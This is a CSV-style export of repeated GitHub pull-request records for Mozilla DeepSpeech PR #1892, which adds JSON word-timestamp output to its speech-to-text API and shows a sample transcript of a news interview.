* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7bda6f0864b7f597556be2c6e0a8300043d2a1f8,"API changes to output word time positions in JSON format

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag"
2456,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61368768485fd864d845d96d87da601520776ae8,Client changes for exposing timing metadata
2457,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,907428c4e08049b6ad7e211e0b872a223f4b88c3,Offset timings by 3ms to account for timesteps not necessarily being from the very start of the word
2458,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d844ef925a108bd39a9e4bdad96938492096908,Updated output to include word duration
2459,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f6545e0ce4540c1baae14c17e7c95e4a2313cb99,"Removed flags and added new API functions to control output

Adds StreamingState::finishStreamExtended, DS_FinishStreamExtended and DS_SpeechToTextExtended"
2460,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2bf9d2014b4fe97e42ef8a7efaa5b400f420186b,Clean up unnecessary std:: prefixes
2461,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
		{""time"":""5.060000"", ""word"":""enter""},
		{""time"":""5.840000"", ""word"":""and""},
		{""time"":""6.140000"", ""word"":""can""},
		{""time"":""6.320000"", ""word"":""we""},
		{""time"":""6.440000"", ""word"":""agree""},
		{""time"":""6.760000"", ""word"":""to""},
		{""time"":""6.900000"", ""word"":""start""},
		{""time"":""7.160000"", ""word"":""with""},
		{""time"":""7.360000"", ""word"":""it""},
		{""time"":""7.580000"", ""word"":""the""},
		{""time"":""7.720000"", ""word"":""one""},
		{""time"":""7.960000"", ""word"":""thing""},
		{""time"":""8.099999"", ""word"":""the""},
		{""time"":""8.300000"", ""word"":""voters""},
		{""time"":""8.679999"", ""word"":""deserving""},
		{""time"":""9.280000"", ""word"":""what""},
		{""time"":""9.440000"", ""word"":""you""},
		{""time"":""9.599999"", ""word"":""yourself""},
		{""time"":""10.059999"", ""word"":""he""},
		{""time"":""10.200000"", ""word"":""said""},
		{""time"":""10.320000"", ""word"":""is""},
		{""time"":""10.440000"", ""word"":""going""},
		{""time"":""10.580000"", ""word"":""to""},
		{""time"":""10.639999"", ""word"":""be""},
		{""time"":""10.700000"", ""word"":""a""},
		{""time"":""10.880000"", ""word"":""very""},
		{""time"":""11.580000"", ""word"":""very""},
		{""time"":""12.080000"", ""word"":""important""},
		{""time"":""12.679999"", ""word"":""election""},
		{""time"":""13.360000"", ""word"":""is""},
		{""time"":""13.580000"", ""word"":""no""},
		{""time"":""13.860000"", ""word"":""son""},
		{""time"":""14.139999"", ""word"":""to""},
		{""time"":""14.240000"", ""word"":""bite""},
		{""time"":""15.320000"", ""word"":""militis""},
		{""time"":""15.900000"", ""word"":""absolutely""},
		{""time"":""16.480000"", ""word"":""crucial""},
		{""time"":""17.340000"", ""word"":""because""},
		{""time"":""17.619999"", ""word"":""this""},
		{""time"":""17.820000"", ""word"":""is""},
		{""time"":""18.279999"", ""word"":""as""},
		{""time"":""19.100000"", ""word"":""i""},
		{""time"":""19.240000"", ""word"":""think""},
		{""time"":""19.400000"", ""word"":""the""},
		{""time"":""19.559999"", ""word"":""most""},
		{""time"":""19.799999"", ""word"":""simple""}
	]
}
```
Timestamps have been tested and found to be accurate.

Related to #1893 ",dabinat,18251622,2019-02-20T04:40:54Z,COLLABORATOR,False,269,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3e9b1eee0029ce71cb3a101c314b4e7ccdd93cf,"Ensure word timings are always positive

This fixes potential issues where the 3ms offset could make the time negative."
2462,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1892,1892,API changes to output word timestamps in JSON format,"This adds the ability to show the timestamps of words as JSON data.

DeepSpeech functions exactly as before by default and you need to set the extended output flag on the StreamingState object in order to output the timing metadata.

Adds the following new functions:
* decode_raw allows you to get the Output vectors from the CTC decoder - use this to perform additional processing on the CTC decoder output
* metadata_from_output gets the word timings as key/value dictionaries - use this to output in a different format e.g. CSV or add additional metadata
* json_output_from_metadata outputs the metadata as a pretty-printed JSON string

Breaking changes:
* DS_SpeechToText now has an additional extendedOutput flag

Output looks like:

```
{
	""file"": {""duration"":""20""},
	""words"": [
		{""time"":""0.020000"", ""word"":""and""},
		{""time"":""0.360000"", ""word"":""now""},
		{""time"":""0.580000"", ""word"":""i""},
		{""time"":""0.760000"", ""word"":""am""},
		{""time"":""1.080000"", ""word"":""joined""},
		{""time"":""1.420000"", ""word"":""life""},
		{""time"":""1.760000"", ""word"":""in""},
		{""time"":""1.880000"", ""word"":""the""},
		{""time"":""2.000000"", ""word"":""studio""},
		{""time"":""2.440000"", ""word"":""by""},
		{""time"":""2.580000"", ""word"":""the""},
		{""time"":""2.720000"", ""word"":""prime""},
		{""time"":""2.960000"", ""word"":""minister""},
		{""time"":""3.380000"", ""word"":""teresa""},
		{""time"":""3.880000"", ""word"":""make""},
		{""time"":""4.080000"", ""word"":""good""},
		{""time"":""4.220000"", ""word"":""morning""},
		{""time"":""4.480000"", ""word"":""from""},
		{""time"":""4.860000"", ""word"":""lin""},
